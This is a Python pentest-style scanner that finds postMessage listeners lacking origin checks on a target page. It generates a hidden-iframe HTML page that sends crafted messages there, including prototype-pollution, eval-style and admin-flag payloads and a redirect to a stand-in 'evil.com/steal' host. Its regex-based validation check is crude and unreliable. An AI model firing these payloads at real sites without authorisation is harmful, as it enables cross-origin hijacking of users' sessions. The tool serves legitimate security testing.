#!/usr/bin/env python3
"""
postMessage Listener Hijacking Scanner — Origin Validation Bypass Detection

MITRE ATT&CK Mapping:
  T1059 - Command and Scripting Interpreter (cross-origin messaging abuse)
  T1203 - Exploitation for Client Execution (postMessage hijacking payload)

Analyzes target pages for postMessage event listeners that lack proper origin
validation. Generates cross-origin test payloads and detects vulnerable handlers.
"""

import argparse
import json
import os
import re
import signal
import sys
import urllib.parse

import requests
from colorama import Fore, Style, init

init(autoreset=True)

SHOULD_EXIT = False
BANNER = f"""{Fore.BLUE}
  ____           _        __  __    _        _   _                      _
 |  _ \\ ___  ___| |_ __ _|  \\/  |__| |_ __ _| |_(_) ___  _ __    __ _(_) ___
 | |_) / _ \\/ __| __/ _` | |\\/| / _` | '__| | __| |/ _ \\| '_ \\  / _` | |/ __|
 |  __/ (_) \\__ \\ || (_| | |  | \\ __|| |  | | |_| | (_) | | | || (_| | |\\__ \\
 |_|   \\___/|___/\\__\\__,_|_|  |_\\__||_|  |_|\\__|_|\\___/|_| |_| \\__,_|_||___/
{Fore.RESET}"""

# Various origin values to test against message handlers
TEST_ORIGINS = ["https://evil.com", "http://evil.com", "null", "file://"]

# Crafted postMessage payloads for different scenarios
MESSAGE_PAYLOADS = [
    {"type": "ping", "payload": "test"},
    {"type": "__proto__", "__proto__": {"polluted": "true"}},
    {"command": "eval", "code": "1+1"},
    {"action": "setItem", "key": "test", "value": "injected"},
    {"action": "redirect", "url": "https://evil.com/steal"},
    {"data": {"type": "config", "admin": True}},
    "INJECTED_MESSAGE_STRING",
]


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted. Exiting gracefully...{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def extract_scripts(html_content):
    """Extract inline and external script URLs from HTML."""
    scripts = []
    # Inline scripts
    inline_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
    for m in inline_pattern.finditer(html_content):
        code = m.group(1).strip()
        if code:
            scripts.append(("inline", code[:2000]))

    # External script URLs
    src_pattern = re.compile(r'<script[^>]*src=["\']([^"\']+)["\']', re.IGNORECASE)
    for m in src_pattern.finditer(html_content):
        scripts.append(("external", m.group(1)))

    return scripts


def find_message_listeners(code, source_label=""):
    """Scan JS code for postMessage listener patterns."""
    findings = []
    patterns = [
        (r'addEventListener\s*\(\s*[\'"]message[\'"]', "addEventListener('message', ...)"),
        (r'onmessage\s*=', "window.onmessage assignment"),
        (r'addEventListener\s*\(\s*[\'"]message[\'"],\s*(\w+)', "addEventListener message handler"),
    ]
    for pattern, desc in patterns:
        for m in re.finditer(pattern, code, re.IGNORECASE):
            context_start = max(0, m.start() - 30)
            context_end = min(len(code), m.end() + 150)
            context = code[context_start:context_end]
            findings.append({
                "source": source_label,
                "description": desc,
                "pattern": m.group(),
                "context": context.strip()[:200],
            })
    return findings


def check_origin_validation(findings):
    """Analyze message listener contexts for origin validation patterns."""
    validated = []
    unvalidated = []

    validation_patterns = [
        r'origin\s*===?\s*',
        r'origin\s*!==?\s*',
        r'e\.origin',
        r'event\.origin',
        r'allowedOrigins',
        r'whitelist',
        r'trustedOrigins',
        r'\.indexOf\(',
        r'\.includes\(',
        r'\.match\(',
        r'/^https?:\/\//',
    ]

    for finding in findings:
        ctx = finding.get("context", "")
        has_validation = any(re.search(p, ctx) for p in validation_patterns)

        # Also check if the handler has an if statement with origin check
        if re.search(r'if\s*\(', ctx) and re.search(r'origin', ctx):
            has_validation = True

        entry = {
            "source": finding["source"],
            "description": finding["description"],
            "has_origin_validation": has_validation,
            "context_snippet": ctx[:150],
        }
        if has_validation:
            validated.append(entry)
        else:
            unvalidated.append(entry)

    return validated, unvalidated


def generate_cross_origin_test_html(target_url, test_messages):
    """Generate HTML that tests postMessage from a cross-origin context."""
    messages_json = json.dumps(test_messages)
    html = f"""<!DOCTYPE html>
<html><head><title>postMessage Cross-Origin Test</title></head>
<body><h3>postMessage Hijacking Test — {target_url}</h3>
<p>This page sends cross-origin postMessages. Open browser console.</p>
<div id="log" style="font-family:monospace;font-size:12px;background:#111;color:#0f0;"></div>
<script>
var targetOrigin = {json.dumps(target_url)};
var testMessages = {messages_json};
var log = document.getElementById('log');
function sendMessage(msg) {{
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = targetOrigin;
    iframe.onload = function() {{
        try {{ iframe.contentWindow.postMessage(msg, '*'); }} catch(e) {{ }}
    }};
    document.body.appendChild(iframe);
}}
testMessages.forEach(function(msg) {{
    setTimeout(function() {{ sendMessage(msg); }}, 1000);
}});
log.textContent = 'Test running... sent ' + testMessages.length + ' messages.\\nCheck browser console for listener responses.';
</script></body></html>"""
    return html


def run_scan(target_url, timeout_sec):
    """Run the postMessage hijacking scan."""
    print(f"\n{Fore.BLUE}[*] Target: {target_url}{Style.RESET_ALL}")

    try:
        resp = requests.get(target_url, timeout=timeout_sec, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        html_content = resp.text
        print(f"{Fore.BLUE}[*] Fetched: HTTP {resp.status_code} | {len(html_content)} bytes{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[X] Failed to fetch: {e}{Style.RESET_ALL}")
        return None

    scripts = extract_scripts(html_content)

    all_findings = []
    for stype, content in scripts:
        if stype == "inline":
            findings = find_message_listeners(content, "inline")
            all_findings.extend(findings)
        elif stype == "external":
            # Try to fetch external scripts
            try:
                ext_url = urllib.parse.urljoin(target_url, content)
                ext_resp = requests.get(ext_url, timeout=timeout_sec)
                if ext_resp.status_code == 200:
                    findings = find_message_listeners(ext_resp.text, content)
                    all_findings.extend(findings)
            except requests.RequestException:
                pass

    # Also scan full HTML for inline event handlers
    html_findings = find_message_listeners(html_content, "HTML")
    all_findings.extend(html_findings)

    validated, unvalidated = check_origin_validation(all_findings)

    test_page_html = generate_cross_origin_test_html(target_url, MESSAGE_PAYLOADS)

    result = {
        "target": target_url,
        "listeners_found": len(all_findings),
        "validated": len(validated),
        "unvalidated": len(unvalidated),
        "validated_listeners": validated,
        "unvalidated_listeners": unvalidated,
        "test_page_html": test_page_html,
    }

    print(f"\n  {Fore.BLUE}  postMessage Listeners Found: {len(all_findings)}{Style.RESET_ALL}")
    if all_findings:
        print(f"  Validated origin: {len(validated)}")
        print(f"  {Fore.YELLOW}  Unvalidated origin: {len(unvalidated)}{Style.RESET_ALL}")

        if unvalidated:
            print(f"\n  {Fore.YELLOW}  Unvalidated Listeners (Potentially Vulnerable):{Style.RESET_ALL}")
            for u in unvalidated:
                print(f"    {Fore.YELLOW}[!]{Style.RESET_ALL} {u['source'][:50]}")
                print(f"    Context: {u['context_snippet'][:100]}...")
                print()
        if validated:
            print(f"\n  {Fore.GREEN}  Validated Listeners:{Style.RESET_ALL}")
            for v in validated:
                print(f"    {Fore.GREEN}[OK]{Style.RESET_ALL} {v['source'][:50]}")
    else:
        print(f"  {Fore.BLUE}  No postMessage listeners detected in fetched content.{Style.RESET_ALL}")

    # Save test page
    test_path = "postmessage_test.html"
    with open(test_path, "w") as f:
        f.write(test_page_html)
    print(f"\n  {Fore.BLUE}[*] Cross-origin test page saved to: {test_path}{Style.RESET_ALL}")
    print(f"  {Fore.BLUE}[*] Open it in a browser targeting {target_url}{Style.RESET_ALL}")

    return result


def print_report(result):
    """Print final assessment."""
    if not result:
        return
    print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}  POSTMESSAGE HIJACKING SCAN REPORT{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
    print(f"  Target     : {result['target']}")
    print(f"  Listeners  : {result['listeners_found']}")
    print(f"  Validated  : {result['validated']}")
    print(f"  Unvalidated: {result['unvalidated']}")

    if result["unvalidated"] > 0:
        print(f"\n  {Fore.RED}VERDICT: POTENTIALLY VULNERABLE{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Found {result['unvalidated']} message listener(s) without origin validation.{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}  Cross-origin windows can send crafted messages to these handlers.{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.GREEN}VERDICT: No vulnerable listeners detected{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}  All found listeners appear to validate the origin.{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="postMessage Hijacking Scanner — Origin Validation Bypass — MITRE T1059, T1203",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py -u https://target.com/page
  python agent.py -u https://target.com/app -t 15
  python agent.py -u https://target.com/iframe -o results.json
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout (default: 10)")
    parser.add_argument("-o", "--output", help="Save to JSON")
    args = parser.parse_args()

    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    result = run_scan(args.url, args.timeout)
    print_report(result)
    if args.output and result:
        out = {k: v for k, v in result.items() if k != "test_page_html"}
        with open(args.output, "w") as f:
            json.dump(out, f, indent=2)
        print(f"\n{Fore.BLUE}[*] Saved to {args.output}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
